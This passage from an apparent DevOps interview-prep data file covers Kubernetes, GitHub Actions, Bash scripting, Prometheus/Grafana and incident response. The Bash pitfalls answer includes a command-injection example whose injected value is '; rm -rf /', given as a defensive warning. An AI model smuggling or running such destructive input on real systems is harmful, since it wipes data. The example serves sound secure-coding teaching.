Missing Secret or ConfigMap:
• Pod events: "secret not found" or "configmap not found"

Debug trick — keep container alive to inspect it:
# Add to deployment spec temporarily:
command: ["sleep", "3600"]
# Then kubectl exec in and run the application manually`,
  },
  {
    id: 65, category: "Kubernetes", difficulty: "Hard",
    q: "Explain Kubernetes resource requests and limits. What happens when limits are exceeded?",
    a: `Resources are defined per container in the pod spec:

resources:
  requests:
    memory: "256Mi"
    cpu: "250m"       # 250 millicores = 0.25 of a CPU core
  limits:
    memory: "512Mi"
    cpu: "1000m"      # 1 full CPU core

Requests — GUARANTEED allocation:
• Used by the Scheduler to place pods on nodes
• A node is "full" when total requests = node capacity (even if actual usage is lower)

Limits — MAXIMUM allowed usage:

CPU limits (compressible):
• Container tries to use more CPU than limit → it is THROTTLED (slows down, not killed)

Memory limits (incompressible):
• Container exceeds memory limit → OOM KILLED by the kernel immediately
• kubectl describe pod shows: "OOMKilled"
• Kubernetes restarts the container → may lead to CrashLoopBackOff

QoS classes (affect eviction priority during node pressure):
• Guaranteed: requests == limits → never evicted unless node is critically full
• Burstable: requests < limits → evicted before Guaranteed pods
• BestEffort: no requests/limits → evicted first

Production rules:
• Always set requests AND limits on every container
• Use LimitRange to set defaults per namespace
• Use ResourceQuota to cap total consumption per namespace
• Monitor with kubectl top pods`,
  },
  {
    id: 66, category: "Kubernetes", difficulty: "Hard",
    q: "What is a Kubernetes Ingress? How does it differ from a LoadBalancer Service?",
    a: `LoadBalancer Service:
• Provisions one cloud load balancer per Service
• Each external service gets its own public IP and LB
• Expensive at scale: 20 microservices = 20 cloud LBs, 20 public IPs
• Good for non-HTTP services (TCP, gRPC, UDP)

Ingress:
• A single entry point for all HTTP/HTTPS traffic
• Routes requests to different Services based on hostname and/or URL path
• One LoadBalancer/IP serves many services — far cheaper
• Also handles: TLS termination, redirects, rewrites

Example:
apiVersion: networking.k8s.io/v1
kind: Ingress
spec:
  tls:
  - hosts: [api.myapp.com]
    secretName: tls-secret
  rules:
  - host: api.myapp.com
    http:
      paths:
      - path: /v1
        pathType: Prefix
        backend:
          service:
            name: api-service
            port:
              number: 80

How it works:
• An Ingress Controller pod (nginx-ingress, Traefik, GKE managed ingress) watches Ingress objects
• Configures itself as a proxy with the routing rules
• TLS termination here; backends use plain HTTP

cert-manager: automates TLS certificate provisioning (Let's Encrypt)

When to use what:
• HTTP/HTTPS microservices → Ingress (cheaper, central TLS, path routing)
• Non-HTTP or single large service → LoadBalancer`,
  },
  {
    id: 67, category: "Kubernetes", difficulty: "Medium",
    q: "What is Kubernetes RBAC and why is it critical for cluster security?",
    a: `RBAC (Role-Based Access Control) controls what actions each identity can perform on which Kubernetes resources.

Core objects:
Role (namespace-scoped):
• Grants permissions within a single namespace
• Defines: verbs (get, list, create, update, delete) on resources (pods, deployments, secrets)

ClusterRole (cluster-scoped):
• Applies cluster-wide — used for node management, cluster-level resources

RoleBinding:
• Binds a Role to a Subject within a namespace
• Subject types: User, Group, ServiceAccount

Example — read-only pod access:
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: staging
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]
---
kind: RoleBinding
subjects:
- kind: User
  name: alice
roleRef:
  kind: Role
  name: pod-reader

ServiceAccounts:
• Identity for pods/applications that need to call the Kubernetes API
• Always create dedicated ServiceAccounts with minimal permissions
• Never use the default ServiceAccount

Debug commands:
kubectl auth can-i delete pods --namespace=prod
kubectl auth can-i --list --namespace=prod`,
  },

  // ── CI/CD ────────────────────────────────────────────────────────────────────
  {
    id: 70, category: "CI/CD", difficulty: "Easy",
    q: "What is CI/CD and what problem does it solve?",
    a: `CI/CD stands for Continuous Integration / Continuous Delivery (or Deployment).

Problem it solves:
• Before CI/CD: developers work in isolation for weeks, merge all at once ("integration hell")
• Deployment is a manual, risky event done rarely
• With CI/CD: small changes integrated constantly, automated tests catch regressions early

Continuous Integration (CI):
• Developers push code frequently (many times per day)
• Every push triggers an automated pipeline:
  1. Pull the code
  2. Install dependencies
  3. Run linting / static analysis
  4. Run unit tests, integration tests
  5. Build the artifact (Docker image, JAR, binary)
• Goal: find bugs at the source, immediately

Continuous Delivery (CD — with approval gate):
• Every successful CI build is ready for production deployment
• A human approves the deploy to production
• Deployment itself is automated once approved

Continuous Deployment (CD — fully automated):
• Every successful CI build is deployed to production automatically
• No human gate — requires very high test coverage
• Used by Netflix, GitHub, Etsy

Tooling: GitHub Actions, GitLab CI/CD, Jenkins, CircleCI, Tekton
GitOps tools: ArgoCD, Flux (pull-based CD)`,
  },
  {
    id: 71, category: "CI/CD", difficulty: "Easy",
    q: "What is GitHub Actions? Explain the key concepts: workflow, job, step, and runner.",
    a: `GitHub Actions is GitHub's built-in CI/CD and automation platform. Workflows are YAML files triggered by GitHub events.

Key concepts:
Workflow:
• A YAML file stored in .github/workflows/
• Triggered by events: push, pull_request, schedule (cron), workflow_dispatch (manual)
• Contains one or more jobs

Job:
• A set of steps running together on the same runner machine
• Jobs run IN PARALLEL by default
• Use needs: [other-job] for sequential execution

Step:
• A single task within a job — either:
  - run: — a shell command
  - uses: — a reusable Action from the Marketplace

Runner:
• The virtual machine executing the job
• GitHub-hosted: ubuntu-latest, windows-latest, macos-latest
• Self-hosted: your own VM registered to GitHub

Minimal example:
name: CI Pipeline
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: "20"
      - run: npm ci
      - run: npm test

Context variables: github.sha, github.ref, github.actor, github.repository`,
  },
  {
    id: 72, category: "CI/CD", difficulty: "Medium",
    q: "How would you build and push a Docker image to a registry in a GitHub Actions workflow?",
    a: `Full production-grade example using Docker Hub:

name: Build and Push
on:
  push:
    branches: [main]

jobs:
  build-push:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to Docker Hub
        uses: docker/login-action@v3
        with:
          username: \${{ secrets.DOCKERHUB_USERNAME }}
          password: \${{ secrets.DOCKERHUB_TOKEN }}

      - name: Build and push image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            myuser/myapp:latest
            myuser/myapp:\${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

Key points:
• secrets.DOCKERHUB_TOKEN → stored in repo Settings → Secrets (never hardcoded)
• github.sha → git commit SHA as image tag — every build is uniquely traceable
• docker/setup-buildx-action → enables BuildKit (faster builds, better caching)
• cache-from: type=gha → uses GitHub Actions cache for faster rebuilds`,
  },
  {
    id: 73, category: "CI/CD", difficulty: "Medium",
    q: "What are GitHub Actions secrets and environments? How do you handle credentials safely?",
    a: `Secrets:
• Encrypted key-value pairs stored outside the workflow YAML
• Never appear in plain text in logs (automatically masked with ***)
• Accessed as: \${{ secrets.MY_SECRET }}
• Set in: Repository → Settings → Secrets and variables → Actions

Types:
• Repository secrets — available to all workflows in the repo
• Organization secrets — shareable across repos in a GitHub org
• Environment secrets — scoped to a specific deployment environment

Environments:
• Named deployment targets (staging, production, dev)
• Each environment can have:
  - Required reviewers — human approval gate before the job runs
  - Branch restrictions — only allow deploys from main/release branches
  - Environment-specific secrets — prod DB password only exists in prod environment

Example:
jobs:
  deploy-production:
    runs-on: ubuntu-latest
    environment: production    # triggers approval + uses prod secrets
    steps:
      - run: ./deploy.sh
        env:
          DB_PASSWORD: \${{ secrets.DB_PASSWORD }}

Best practices:
1. Use OIDC / Workload Identity Federation instead of long-lived credentials:
   • GitHub requests a short-lived token from GCP/AWS at runtime
   • No stored access keys in GitHub
   • Supported by: google-github-actions/auth, aws-actions/configure-aws-credentials

2. Use environment-scoped secrets so prod credentials are never accessible in dev jobs
3. Rotate secrets regularly`,
  },
  {
    id: 74, category: "CI/CD", difficulty: "Medium",
    q: "What is GitOps and how does it differ from traditional CI/CD?",
    a: `GitOps is a deployment model where Git is the single source of truth for both application code and infrastructure/deployment configuration.

Core principle: if it's not in Git, it doesn't exist. The cluster MUST match what Git says.

Traditional CI/CD (push-based):
• Pipeline runs → pipeline has credentials → runs kubectl apply directly into the cluster
• Drift can occur: someone applies a manual fix but Git doesn't reflect it
• Pipeline needs write access to production — a security risk

GitOps (pull-based):
• Desired state declared in Git (Kubernetes manifests, Helm values)
• A GitOps operator (ArgoCD, Flux) runs INSIDE the cluster
• Operator continuously compares cluster state vs. Git desired state
• When they drift → operator automatically reconciles the cluster back to Git
• Production never grants external write access — operator pulls from Git

Benefits:
• Complete audit trail — every change is a git commit
• Easy rollback — git revert → cluster reverts automatically
• Drift detection and self-healing
• Better security — no external credentials to production cluster

In a GCP/GKE workflow:
1. Developer merges to main
2. CI builds and pushes Docker image, updates image tag in manifest repo
3. ArgoCD detects the change in Git → automatically deploys to GKE

Tools: ArgoCD (popular, web UI), Flux CD (more lightweight, strong Helm support)`,
  },
  {
    id: 75, category: "CI/CD", difficulty: "Hard",
    q: "A GitHub Actions workflow is failing. How do you debug it?",
    a: `Step 1 — Read the failure in the Actions UI:
Repo → Actions → failed run → failed job → expand the failed step
The error is almost always right there in the step output.

Step 2 — Interpret common exit codes:
• Exit 1 → command returned failure (look at output above for the actual error)
• Exit 127 → command not found (tool not installed, typo in command)
• "Resource not accessible by integration" → GITHUB_TOKEN lacks required permissions

Step 3 — Enable debug logging:
Add these as repository secrets:
  ACTIONS_STEP_DEBUG = true          # verbose step-level output
  ACTIONS_RUNNER_DEBUG = true        # runner agent debug
Then re-run the failed workflow.

Step 4 — Add explicit debug steps:
- name: Debug context
  run: |
    echo "Working dir: $(pwd)"
    ls -la
    env | sort
    which docker && docker --version

Step 5 — Common causes and fixes:
• Secrets missing/misspelled → name is case-sensitive, check it's set for the right env
• File not found → wrong working-directory, or forgot actions/checkout first
• Script not executable → add: run: chmod +x deploy.sh before using it
• Docker push fails → registry auth expired, wrong tag, no imagePullSecrets
• Timeout → add timeout-minutes: 30 to the job

Step 6 — Check workflow permissions:
permissions:
  contents: read
  packages: write      # needed to push to GitHub Container Registry
  id-token: write      # needed for OIDC auth to GCP/AWS`,
  },
  {
    id: 76, category: "CI/CD", difficulty: "Medium",
    q: "What are blue/green and canary deployment strategies?",
    a: `Rolling Update (Kubernetes default):
• Replaces old pods with new ones progressively
• Old and new versions run simultaneously during the rollout
• Zero downtime if health checks pass
• Simplest — no extra infrastructure needed

Blue/Green:
• Two identical environments: Blue (current) and Green (new version)
• Deploy new version to Green completely; test it while Blue serves all traffic
• When satisfied: switch traffic (one DNS change or LB target group swap)
• Instant rollback: switch back to Blue
• Pros: instant cutover, instant rollback
• Cons: 2× infrastructure cost during transition

Canary:
• Route a small percentage of real traffic to the new version (e.g., 5%)
• Monitor error rate, latency, business metrics on the canary
• If healthy: progressively increase traffic (5% → 25% → 50% → 100%)
• If problems: route all traffic back immediately
• Pros: real user validation, minimal blast radius
• Cons: more complex, need good observability

In Kubernetes:
• Rolling: built-in Deployment RollingUpdate strategy
• Blue/Green: two Deployments, one Service — switch Service's label selector
• Canary: Argo Rollouts or Flagger automates traffic splitting + automated analysis`,
  },

  // ── BASH SCRIPTING ───────────────────────────────────────────────────────────
  {
    id: 80, category: "Bash", difficulty: "Easy",
    q: "What are the core Bash scripting constructs a sysadmin must know?",
    a: `Shebang and safety:
#!/bin/bash
set -euo pipefail    # e=exit on error, u=error on unset var, o pipefail=catch pipe errors

Variables:
NAME="world"
echo "Hello, $NAME"
RESULT=$(command)            # command substitution — captures output
CALC=$((10 + 5))             # arithmetic

Conditionals:
if [ -f "/etc/nginx/nginx.conf" ]; then
  echo "Nginx config exists"
elif [ -d "/etc/apache2" ]; then
  echo "Apache exists"
else
  echo "Neither found"
fi

Test operators:
-f file    # file exists and is regular file
-d dir     # directory exists
-z "$var"  # variable is empty
-n "$var"  # variable is not empty

Loops:
for host in web1 web2 db1; do ssh "$host" "uptime"; done
for f in /var/log/*.log; do echo "Processing $f"; done
while read -r line; do echo "$line"; done < /etc/hosts

Functions:
log() {
  echo "[$(date +%Y-%m-%d\ %H:%M:%S)] $*"
}
log "Script started"

Exit codes:
$?         # exit code of last command (0 = success)
exit 1     # signal failure to caller`,
  },
  {
    id: 81, category: "Bash", difficulty: "Medium",
    q: "Write a Bash script that checks if a list of servers is reachable and logs results.",
    a: `#!/bin/bash
set -euo pipefail

HOSTS=("web1.example.com" "web2.example.com" "db1.example.com" "10.0.0.50")
LOG="/var/log/host_check.log"
FAILED=0

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG"
}

log "=== Host check started ==="

for host in "\${HOSTS[@]}"; do
  if ping -c 1 -W 2 "$host" &>/dev/null; then
    log "OK   $host"
  else
    log "FAIL $host — unreachable"
    FAILED=$((FAILED + 1))
  fi
done

log "=== Done: $FAILED host(s) unreachable ==="

if [ "$FAILED" -gt 0 ]; then
  exit 1    # signals failure to cron / calling process
fi

Concepts demonstrated:
• Array: HOSTS=(...), iterate with "\${HOSTS[@]}"
• ping -c 1 = one packet; -W 2 = 2-second timeout
• &>/dev/null = redirect stdout AND stderr to /dev/null
• tee -a = write to stdout AND append to log file
• Arithmetic: $((FAILED + 1))
• Meaningful exit code: 0 = all healthy, 1 = at least one failed

Schedule with cron:
*/5 * * * * /opt/scripts/check_hosts.sh`,
  },
  {
    id: 82, category: "Bash", difficulty: "Medium",
    q: "How do you use grep, awk, and sed for text processing in sysadmin work?",
    a: `grep — filter and search lines:
grep "error" /var/log/syslog             # lines containing "error"
grep -i "error" /var/log/syslog          # case-insensitive
grep -v "debug" /var/log/app.log         # invert: lines NOT matching
grep -r "TODO" /app/src/                 # recursive search
grep -E "error|warn|crit" file           # multiple patterns (OR)
grep -n "error" file                     # show line numbers
grep -A 3 "Exception" file               # 3 lines AFTER each match

awk — field/column extraction:
awk '{print $1}' file                    # print first field
awk -F: '{print $1, $3}' /etc/passwd     # colon delimiter; print username and UID
awk '$3 > 1000 {print $1}' /etc/passwd   # conditional: print names where UID > 1000
df -h | awk 'NR>1 {print $5, $6}'        # skip header, print % used + mount
ps aux | awk 'NR>1 {sum += $3} END {print "Total CPU%:", sum}'

sed — stream editor: find/replace:
sed 's/foo/bar/' file                    # replace first occurrence per line
sed 's/foo/bar/g' file                   # replace ALL occurrences
sed -i 's/old_host/new_host/g' config    # edit file IN PLACE (backup first!)
sed '/^#/d' file                         # delete comment lines
sed -n '10,20p' file                     # print only lines 10-20

Powerful pipeline:
journalctl -u nginx --since "1 hour ago" \
  | grep -i "error|warn" \
  | awk '{print $1, $2, $3, $NF}' \
  | sort | uniq -c | sort -rn | head -20`,
  },
  {
    id: 83, category: "Bash", difficulty: "Medium",
    q: "Write a Bash script to clean up old log files and compress recent ones.",
    a: `#!/bin/bash
set -euo pipefail

LOG_DIR="/var/log/myapp"
SCRIPT_LOG="/var/log/log_cleanup.log"
KEEP_DAYS=30
COMPRESS_DAYS=7

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$SCRIPT_LOG"
}

log "Starting log cleanup"

if [ ! -d "$LOG_DIR" ]; then
  log "ERROR: $LOG_DIR does not exist"
  exit 1
fi

# Count files to delete
DELETE_COUNT=$(find "$LOG_DIR" -maxdepth 1 -name "*.log" -mtime +"$KEEP_DAYS" | wc -l)

# Delete files older than KEEP_DAYS
find "$LOG_DIR" -maxdepth 1 -name "*.log" -mtime +"$KEEP_DAYS" -exec rm -f {} \;
log "Deleted $DELETE_COUNT files older than \${KEEP_DAYS} days"

# Compress files older than COMPRESS_DAYS (not already compressed)
find "$LOG_DIR" -maxdepth 1 -name "*.log" -mtime +"$COMPRESS_DAYS" ! -name "*.gz" \
  -exec gzip -9 {} \;
log "Compressed log files older than \${COMPRESS_DAYS} days"

DISK=$(du -sh "$LOG_DIR" | cut -f1)
log "Log directory size after cleanup: $DISK"

Key find options:
-maxdepth 1  → don't recurse into subdirectories
-mtime +30   → modified MORE than 30 days ago
! -name "*.gz" → exclude already compressed files

Dry run test:
find "$LOG_DIR" -name "*.log" -mtime +"$KEEP_DAYS" -exec echo "Would delete: {}" \;

Schedule: 0 2 * * * /opt/scripts/log_cleanup.sh`,
  },
  {
    id: 84, category: "Bash", difficulty: "Hard",
    q: "What are common Bash scripting pitfalls and how do you avoid them?",
    a: `1. Not quoting variables — causes word splitting and glob expansion:
BAD:  cp $file /backup/
GOOD: cp "$file" "/backup/"

2. Not using set -euo pipefail:
BAD:  cp file /backup; echo "Done"   # "Done" prints even if cp failed
GOOD: set -euo pipefail at the top of every script

3. Parsing ls output — breaks on spaces in filenames:
BAD:  for f in $(ls /tmp/*.log); do ...
GOOD: for f in /tmp/*.log; do ...    # glob is safe

4. Missing local in functions:
GOOD: local tmp="$1"    # always use local for function variables

5. Backticks instead of $():
BAD:  RESULT=\`some_command\`
GOOD: RESULT=$(some_command)    # nestable: $(outer $(inner))

6. Command injection via untrusted input:
BAD:  eval "ls $USER_INPUT"    # could be: "; rm -rf /"
GOOD: Never use eval with user-provided data

7. Missing error handling:
GOOD: result=$(some_command) || { echo "Failed"; exit 1; }

8. Not initializing variables:
GOOD: COUNTER=0; COUNTER=$((COUNTER + 1))

Testing tools:
bash -n script.sh    # syntax check only
bash -x script.sh    # trace every command (debug mode)
shellcheck script.sh # static analysis tool for bash scripts`,
  },
  {
    id: 85, category: "Bash", difficulty: "Medium",
    q: "How do you pass arguments to a Bash script and validate them?",
    a: `Positional parameters:
$0  = script name
$1  = first argument
$2  = second argument
$@  = all arguments as separate quoted words (safe to iterate)
$#  = number of arguments provided

Example with validation:
#!/bin/bash
set -euo pipefail

usage() {
  echo "Usage: $0 <environment> <action>"
  echo "  Environments: dev | staging | prod"
  exit 1
}

if [ "$#" -ne 2 ]; then
  echo "Error: expected 2 arguments, got $#."
  usage
fi

ENV="$1"
ACTION="$2"

case "$ENV" in
  dev|staging|prod)
    ;;   # valid, continue
  *)
    echo "Invalid environment: '$ENV'"
    usage
    ;;
esac

echo "Running '$ACTION' on '$ENV'..."

Named/optional arguments with getopts:
while getopts "e:a:vh" opt; do
  case $opt in
    e) ENV="$OPTARG" ;;
    a) ACTION="$OPTARG" ;;
    v) VERBOSE=true ;;
    h) usage ;;
    ?) usage ;;
  esac
done
# ./deploy.sh -e prod -a restart -v`,
  },
  {
    id: 86, category: "Bash", difficulty: "Hard",
    q: "How do you safely handle secrets and sensitive data in Bash scripts?",
    a: `Rule #1: NEVER hardcode secrets in scripts. They end up in git history, process lists, and log files.

Method 1 — Environment variables (most common):
source /etc/myapp/secrets.env    # file contains: export DB_PASSWORD="secret"
# Protect the file:
chmod 600 /etc/myapp/secrets.env
chown myapp:myapp /etc/myapp/secrets.env
# Add secrets.env to .gitignore — NEVER commit it

Method 2 — Read from a file at runtime:
DB_PASSWORD=$(< /run/secrets/db_password)   # Docker secrets or k8s secret mount

Method 3 — Pull from a secret manager:
# GCP Secret Manager:
DB_PASSWORD=$(gcloud secrets versions access latest --secret="db-password")

# AWS SSM Parameter Store:
DB_PASSWORD=$(aws ssm get-parameter --name "/myapp/db_password" --with-decryption --query Parameter.Value --output text)

Prevent leaking in logs:
set +x    # disable bash -x tracing around secret operations
# Never echo secrets: echo "Password: $DB_PASSWORD" ← never

Avoid passing on command line (visible in ps aux):
BAD:  mysql -u root -p"$DB_PASSWORD"    # visible to other users via ps
GOOD: Use MySQL config file: ~/.my.cnf with [client] password=...
GOOD: export PGPASSWORD="$DB_PASSWORD"; psql -U admin mydb`,
  },

  // ── MONITORING & LOGGING ────────────────────────────────────────────────────
  {
    id: 90, category: "Monitoring", difficulty: "Easy",
    q: "What is the difference between monitoring, logging, and distributed tracing?",
    a: `These are the three pillars of observability — together they let you understand what's happening inside your systems.

Monitoring (Metrics):
• Collecting numerical measurements over time (time-series data)
• Examples: CPU %, HTTP request rate (req/s), error rate, latency (ms)
• Answers: "Is the system healthy? Is it exceeding a threshold?"
• Triggers alerts when thresholds are crossed
• Tools: Prometheus + Grafana, Datadog, CloudWatch, GCP Cloud Monitoring

Logging:
• Capturing discrete events that occurred (timestamped text records)
• Examples: "2024-01-15 14:32:01 ERROR: database connection refused"
• Answers: "What happened, exactly, and when?"
• Essential for debugging individual issues
• Tools: ELK Stack, Grafana Loki, Splunk, GCP Cloud Logging

Distributed Tracing:
• Tracks the journey of a single request as it flows through multiple microservices
• Each service adds a span with timing; all spans share a trace ID
• Answers: "Where is the latency? Which service is the bottleneck?"
• Essential in microservices where one user action hits 5-10 services
• Tools: Jaeger, Zipkin, Google Cloud Trace, Datadog APM, OpenTelemetry

Why all three together:
• Monitoring: tells you THERE IS A FIRE (error rate spike)
• Logging: tells you WHAT CAUSED THE FIRE (specific error messages)
• Tracing: tells you WHERE IT STARTED (which service introduced the latency)`,
  },
  {
    id: 91, category: "Monitoring", difficulty: "Medium",
    q: "How does Prometheus work? Explain metrics, exporters, and the scrape model.",
    a: `Prometheus is an open-source time-series monitoring system that PULLS (scrapes) metrics from targets over HTTP.

Flow:
1. Targets expose metrics at GET /metrics (text-format)
2. Prometheus scrape_config lists which targets to scrape and how often (e.g., every 15s)
3. Prometheus scrapes, stores data in its local TSDB
4. Query with PromQL; Grafana visualizes; Alertmanager fires alerts

Metric types:
• Counter — only increases (total requests, total errors): http_requests_total
• Gauge — can go up or down (current memory use): node_memory_MemAvailable_bytes
• Histogram — distribution in buckets (request duration): http_request_duration_seconds_bucket
• Summary — calculates quantiles client-side

Exporters — translate service metrics into Prometheus format:
• node_exporter — host-level: CPU, memory, disk, network
• blackbox_exporter — probes endpoints: is URL up? TLS valid?
• kube-state-metrics — K8s object state: pod running? deployment replicas?
• mysql_exporter, postgres_exporter, redis_exporter — database metrics

Essential PromQL:
# CPU usage %:
100 - avg by(instance)(rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100

# HTTP error rate:
rate(http_requests_total{status=~"5.."}[5m]) / rate(http_requests_total[5m]) * 100

# Request rate per second:
rate(http_requests_total[5m])`,
  },
  {
    id: 92, category: "Monitoring", difficulty: "Medium",
    q: "What is Grafana and how does it work with Prometheus?",
    a: `Grafana is an open-source visualization and dashboarding platform.

Relationship with Prometheus:
• Prometheus = the database (stores time-series data, handles scraping and alerting)
• Grafana = the frontend (queries Prometheus with PromQL and renders visualizations)
• Almost always deployed together

How Grafana works:
1. Configure a data source (Prometheus URL)
2. Create a dashboard with panels
3. Each panel has a PromQL query → rendered as graph, stat, gauge, table
4. Add variables (dropdowns) to filter by instance, namespace, service
5. Set alerts on panels → route to Slack/PagerDuty/email

Key concepts:
• Data source — connection to: Prometheus, Loki, Elasticsearch, CloudWatch, MySQL
• Dashboard — collection of panels organized into rows
• Panel — single visualization with a query
• Variable — dynamic dropdown ($namespace, $instance)

Pre-built dashboards (import from grafana.com):
• ID 1860 — Node Exporter Full (CPU, memory, disk per host)
• ID 3119 — Kubernetes cluster monitoring
• ID 7362 — PostgreSQL metrics

kube-prometheus-stack Helm chart:
• Installs Prometheus + Grafana + Alertmanager + node_exporter + kube-state-metrics in one chart
• Pre-configured Kubernetes dashboards included
• Standard starting point for K8s monitoring`,
  },
  {
    id: 93, category: "Monitoring", difficulty: "Medium",
    q: "What is the ELK Stack? How does log aggregation work in a microservices environment?",
    a: `ELK Stack (now Elastic Stack) is a centralized log management platform:

Elasticsearch:
• Distributed search and analytics engine
• Stores and indexes log data as JSON documents
• Enables fast full-text search across billions of records
• REST API: GET /index/_search?q=error

Logstash:
• Data pipeline: collects logs → transforms/parses → ships to Elasticsearch
• Grok filter: parses unstructured text (nginx logs) into structured fields
• Input: file, syslog, Beats, Kafka

Kibana:
• Web UI for searching and visualizing data in Elasticsearch
• Discover: search raw logs; Visualize: charts; Dashboard: combined views

Filebeat:
• Lightweight agent on every server/container
• Tails log files, ships to Logstash or Elasticsearch directly
• Much lighter than Logstash — runs on every node

Modern alternative for Kubernetes — Grafana Loki:
• Stores log streams indexed by labels only (not full-text) — cheaper
• Query with LogQL (similar to PromQL)
• Works natively with Grafana; Promtail agent ships logs from pods
• Better suited for K8s where pods are ephemeral

GCP equivalent: Cloud Logging (Stackdriver) — auto-collects GKE pod logs, routes to BigQuery or Pub/Sub`,
  },
  {
    id: 94, category: "Monitoring", difficulty: "Hard",
    q: "How do you write a Prometheus alert rule? Walk through the syntax.",
    a: `Alert rules are YAML files that Prometheus loads (configured via rule_files: in prometheus.yml).

Full example:
groups:
  - name: infrastructure-alerts
    interval: 1m
    rules:
      - alert: HighCPUUsage
        expr: |
          100 - (avg by(instance)(
            rate(node_cpu_seconds_total{mode="idle"}[5m])
          ) * 100) > 85
        for: 5m    # must stay true for 5 min before firing (prevents flapping)
        labels:
          severity: warning
        annotations:
          summary: "High CPU on {{ $labels.instance }}"
          description: "CPU usage is {{ $value | humanize }}% for 5+ minutes"

      - alert: DiskSpaceLow
        expr: |
          (node_filesystem_avail_bytes{mountpoint="/",fstype!="tmpfs"}
           / node_filesystem_size_bytes{mountpoint="/",fstype!="tmpfs"}) * 100 < 10
        for: 10m
        labels:
          severity: critical
        annotations:
          summary: "Disk almost full on {{ $labels.instance }}"

      - alert: PodCrashLooping
        expr: rate(kube_pod_container_status_restarts_total[15m]) * 60 * 15 > 3
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Pod {{ $labels.namespace }}/{{ $labels.pod }} is crash-looping"

Key fields:
• expr — PromQL expression; alert fires when this evaluates to non-zero
• for — "pending" duration; must stay true this long to avoid noise from transient spikes
• labels.severity — used by Alertmanager routing rules
• annotations — human-readable info; $labels.* and $value are templated

Alertmanager routes alerts based on labels to Slack, PagerDuty, email, etc.`,
  },
  {
    id: 95, category: "Monitoring", difficulty: "Easy",
    q: "What are SLIs, SLOs, and SLAs? Why do they matter for monitoring and on-call?",
    a: `These come from Google's SRE book and define how reliable a service needs to be.

SLI — Service Level Indicator:
• A specific, measurable metric that quantifies one aspect of reliability
• Must be a ratio/percentage (0% = totally broken, 100% = perfect)
• Examples:
  - Availability: successful requests / all requests × 100
  - Latency: requests served in < 300ms / all requests × 100
  - Error rate: 100 − (error responses / all responses × 100)

SLO — Service Level Objective:
• The TARGET value for an SLI — internal goal
• Example: "99.9% of requests will succeed" or "p99 latency < 500ms"

Error Budget:
• Budget = 100% − SLO target
• 99.9% SLO = 0.1% allowed failures = ~43 minutes of downtime per month
• Empty error budget = no more risky deployments until it refills

SLA — Service Level Agreement:
• A LEGAL/CONTRACTUAL commitment to customers
• Usually less strict than your SLO (you need internal headroom)
• Breach = financial compensation / service credits
• Example: AWS S3 SLA = 99.9% monthly uptime

Why it matters for monitoring:
• Alert on SLO burn rate, not arbitrary thresholds
• "Alert when error budget will be exhausted in 2 hours at current rate" = meaningful
• "Alert when CPU > 80%" = not necessarily meaningful (may not impact users)
• SLO-based alerting → fewer false alarms, more actionable pages`,
  },

  // ── INCIDENT RESPONSE ────────────────────────────────────────────────────────
  {
    id: 100, category: "Incident Response", difficulty: "Easy",
    q: "What is an incident response process? Walk through the lifecycle of a production incident.",
    a: `An incident is any unplanned interruption or degradation to a production service.

Lifecycle:

1. Detection:
   • Monitoring alert fires (Prometheus/Alertmanager, PagerDuty, Datadog)
   • User report via support ticket or Slack
   • Automated synthetic check fails

2. Acknowledge:
   • On-call engineer ACKs the alert → stops escalation
   • Quick assessment: what's broken? how many users? what severity?
   • P1 (critical) → page additional people immediately

3. Communicate (even before you know the answer):
   • Post in #incidents: "Investigating elevated errors on checkout API. Update in 10 min."
   • Update status page

4. Mitigate (restore service — this is the priority):
   • Stop the bleeding FIRST, find the root cause AFTER
   • Rollback a bad deploy, scale up, re-route traffic, toggle a feature flag

5. Investigate:
   • Check dashboards, logs, traces
   • "What changed right before this started?"

6. Resolve + communicate resolution:
   • Update status page: "Resolved at 14:37 UTC"

7. Post-Incident Review (Postmortem):
   • Blameless analysis: what happened, why, timeline, action items
   • Written within 24-48 hours while fresh`,
  },
  {
    id: 101, category: "Incident Response", difficulty: "Medium",
    q: "Production is down. Walk through your first 5 minutes as the on-call engineer.",
    a: `Minute 0-1 — Acknowledge and Orient:
• ACK the alert in PagerDuty/OpsGenie (stops escalation timer)
• Open monitoring dashboard — what metric triggered? Error rate? Latency?
• Post immediately in #incidents: "Investigating [alert name] — will update in 5 min"
• Is it one service, one region, or everything?

Minute 1-2 — Check "What Changed?":
• Any deploy in the last 30 minutes? (GitHub Actions, ArgoCD)
• Any infrastructure changes? (Terraform runs, config changes, certificate rotation)
• The #1 cause of production incidents: something changed right before it broke

Minute 2-3 — Diagnose by layer:
• Application: kubectl get pods -A | grep -v Running → CrashLoopBackOff?
• Logs: kubectl logs <pod> --previous — stack traces, "connection refused", OOMKilled?
• Database: is the DB reachable? Connection pool exhausted?
• DNS: dig mysite.com — still resolving correctly?

Minute 3-4 — Mitigate if cause is clear:
kubectl rollout undo deployment/web         # rollback bad deploy
kubectl scale deployment/web --replicas=10  # scale for traffic spike
kubectl delete pod <crashing-pod>           # restart misbehaving pod

Minute 4-5 — Communicate and escalate:
• Update #incidents: "Root cause appears to be X. Rolling back deploy from 14:22."
• If stuck → page additional help NOW. No hero solo acts.

Rule: communicate often, communicate early. "I don't know yet but I'm investigating" is valuable.`,
  },
  {
    id: 102, category: "Incident Response", difficulty: "Medium",
    q: "What is a blameless postmortem and what should it include?",
    a: `A postmortem is a structured analysis written after an incident to understand what happened and prevent recurrence.

"Blameless" means:
• The goal is to fix SYSTEMS and PROCESSES — not to punish individuals
• Mistakes are expected; good systems prevent those mistakes from causing outages
• Psychological safety is critical — people share what actually happened
• Pioneered by Google SRE, now standard in mature DevOps orgs

Structure:
1. Incident Summary
   • What happened, when, how long, how many users/services affected

